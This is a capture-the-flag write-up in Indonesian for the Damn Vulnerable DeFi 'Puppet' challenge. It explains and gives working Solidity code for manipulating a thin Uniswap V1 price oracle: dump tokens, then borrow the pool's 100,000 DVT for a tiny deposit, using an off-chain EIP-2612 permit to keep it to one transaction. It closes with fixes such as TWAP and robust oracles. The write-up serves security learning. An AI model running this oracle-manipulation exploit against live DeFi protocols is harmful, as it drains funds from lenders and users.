# Damn Vulnerable DeFi — Puppet (Writeup)

> Status: **SOLVED** ✅ (`[PASS] test_puppet`)
> Goal: kuras 100.000 DVT dari `PuppetPool`, pindahin semua ke akun `recovery`.
> Modal: 25 ETH + 1000 DVT. Syarat: cuma boleh **1 transaksi** (`nonce == 1`).

---

## 1. Peta kontrak

Puppet melibatkan 3 kontrak:

| Kontrak | Peran |
|---|---|
| `PuppetPool` | Tempat minjem. Nyimpen 100rb DVT. Buat pinjem, harus setor **2x nilai ETH**-nya sebagai jaminan. |
| Uniswap V1 Exchange | Pasar DVanya ETH. Isinya cuma **10 ETH / 10 DVT**. Ini yang dipake pool jadi **sumber harga**. |
| `DamnValuableToken` | Token DVT-nya (solmate ERC20 — punya `permit`). |

---

## 2. Titik incaran: oracle harga

Pool nentuin berapa jaminan yang harus disetor dari harga token. Harganya diambil dari sini:

```solidity
// PuppetPool.sol
function _computeOraclePrice() private view returns (uint256) {
    // harga token (wei) = ETH di pool Uniswap / token di pool Uniswap
    return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
}
```

Sekarang: 10 ETH / 10 DVT = **1 ETH per token**.

Terus jaminannya:

```solidity
function calculateDepositRequired(uint256 amount) public view returns (uint256) {
    return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;  // DEPOSIT_FACTOR = 2
}
```

Buat pinjem 100rb token di harga normal → butuh jaminan **200.000 ETH**. Player cuma punya 25. Mustahil.

**Titik lemahnya:** harga diambil dari pasar Uniswap yang **cuma isi 10 token**. Padahal player pegang **1000 token** — 100x isi pasarnya. Artinya harga bisa kita geser sendirian.

---

## 3. Bug-nya

**Oracle manipulation lewat pasar tipis (thin spot market).**

Formulanya sendiri gak salah — matematikanya bener. Yang bermasalah itu **sumber**-nya: pool ngambil *spot price* dari pasar yang segitu kecilnya, jadi 1 trade doang cukup buat ngebohongin harga. Matematika bener + input dimanipulasi = hasil ancur.

---

## 4. Alur serangan

Urutannya **wajib** dump dulu, baru borrow:

1. **Dump 1000 DVT ke Uniswap** → pasar jadi kebanjiran token, ETH-nya kesedot keluar.
   - Uniswap constant product: `ETH × token = k`. Awal `10 × 10 = 100`.
   - Abis dump: token = 1010 → ETH = 100/1010 ≈ **0.099**.
   - Harga oracle jadi ~0.0001 ETH/token → **crash ~10.000x**.
2. **Borrow 100rb DVT** → sekarang jaminan yang dibutuhin cuma ~**20 ETH** (dari yang tadinya 200.000). Kirim langsung ke `recovery`.

**Kenapa dump harus sebelum borrow?** Kalau borrow duluan, harga masih 1 ETH/token → jaminan 200.000 ETH → gak kebayar. Harga harus di-crash dulu baru minjem jadi murah.

**Kenapa harus 1 kontrak (constructor)?** `_isSolved` minta `nonce == 1` → player cuma boleh kirim 1 tx. Semua digabung di constructor `attackPuppet`; deploy-nya sendiri = 1 tx itu.

### Masalah "token ada di dompet player"
Token 1000 itu ada di **player**, bukan di kontrak attacker. Normalnya butuh `approve` on-chain dulu — tapi itu jadi **tx kedua**, langgar `nonce == 1`.

Solusinya: **`permit` (EIP-2612)**. Player tanda tangan "izin" **off-chain** (pake `vm.sign`, gak nambah nonce) yang ngebolehin kontrak attacker narik token player. Ibarat tanda tangan di belakang cek — nyoret di kertas gratis, orang lain yang setor ke bank.

Alamat spender (si attacker) diprediksi duluan pake `vm.computeCreateAddress(player, 0)` karena kontraknya belum ada pas nandatangan.

---

## 5. Kode solusi

### `test_puppet` (tanda tangan off-chain + deploy = 1 tx)
```solidity
function test_puppet() public checkSolvedByPlayer {
    // tebak alamat attacker sebelum di-deploy (nonce player masih 0)
    address attackAddr = vm.computeCreateAddress(player, vm.getNonce(player));
    uint256 deadline = block.timestamp;

    // digest permit EIP-712: "player izinin attackAddr belanja 1000 token"
    bytes32 structHash = keccak256(abi.encode(
        keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"),
        player, attackAddr, PLAYER_INITIAL_TOKEN_BALANCE, token.nonces(player), deadline
    ));
    bytes32 digest = keccak256(abi.encodePacked("\x19\x01", token.DOMAIN_SEPARATOR(), structHash));
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPrivateKey, digest);   // sign off-chain (gak nambah nonce)

    // 1 tx: deploy attacker + danain pake semua ETH buat jaminan
    new attackPuppet{value: player.balance}(
        token, lendingPool, uniswapV1Exchange, recovery, player, deadline, v, r, s
    );
}
```

### Kontrak attacker (semua serangan di constructor)
```solidity
contract attackPuppet {
    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;
    address recovery;
    address player;
    uint256 tokenToPull = 1000e18;      // token yg ditarik dari player + didump

    constructor(
        DamnValuableToken _token,
        PuppetPool _lendingPool,
        IUniswapV1Exchange _uniswapV1Exchange,
        address _recovery,
        address _player,
        uint256 deadline, uint8 v, bytes32 r, bytes32 s
    ) payable {
        token = _token;
        lendingPool = _lendingPool;
        uniswapV1Exchange = _uniswapV1Exchange;
        recovery = _recovery;
        player = _player;

        token.permit(player, address(this), tokenToPull, deadline, v, r, s);  // cairin izin dari tanda tangan
        token.transferFrom(player, address(this), tokenToPull);               // tarik 1000 token player ke sini
        token.approve(address(uniswapV1Exchange), tokenToPull);               // izinin Uniswap narik token kita
        uniswapV1Exchange.tokenToEthSwapInput(tokenToPull, 1, deadline);       // DUMP -> harga crash
        lendingPool.borrow{value: address(this).balance}(100_000e18, recovery); // BORROW semua -> ke recovery
    }
}
```

---

## 6. Konsep yang dipelajari

- **Oracle manipulation (thin pool)**: kalau kontrak ngambil harga dari spot price pasar tipis, satu trade bisa ngegeser harga itu → semua yang percaya harga itu ketipu.
- **Uniswap V1 constant product (`x * y = k`)**: dump token ke pool → sisi token naik, sisi ETH turun → harga token anjlok. Bukan harga "diketik", tapi konsekuensi rumus.
- **`permit` (EIP-2612)**: izin belanja token lewat **tanda tangan off-chain**, buat skip tx `approve`. Ibarat nandatangan belakang cek. Alasan dipake di sini: biar tetap **1 transaksi**.
- **Off-chain vs on-chain**: `vm.sign` bikin tanda tangan di komputer sendiri — gak kirim tx, gak nambah nonce. Cuma `new attackPuppet(...)` yang keitung 1 tx.
- **`vm.computeCreateAddress(deployer, nonce)`**: nebak alamat kontrak sebelum di-deploy (alamat CREATE = fungsi dari deployer + nonce). Dipake buat isi `spender` di permit.
- **Semua di constructor**: kalau syaratnya 1 tx, gabung semua logika di constructor — deploy-nya = tx itu (sama kayak Truster).

---

## 7. Pelajaran keamanan

**Bug utama:** `PuppetPool` percaya sama *spot price* dari pool Uniswap yang isinya cuma 10 token. Harga segitu bisa digeser sendirian cuma dengan modal token yang lebih gede dari isi pool.

**Cara benerin (dunia nyata):**
- Pakai **TWAP** (time-weighted average price) — harga rata-rata sepanjang waktu, gak bisa dicrash 1 trade.
- Atau ambil harga dari **oracle yang dalam & susah digerakin** (contoh Chainlink), bukan spot price pool kecil.
- Intinya: **jangan pernah percaya harga dari pool tipis yang bisa digeser 1 transaksi.**
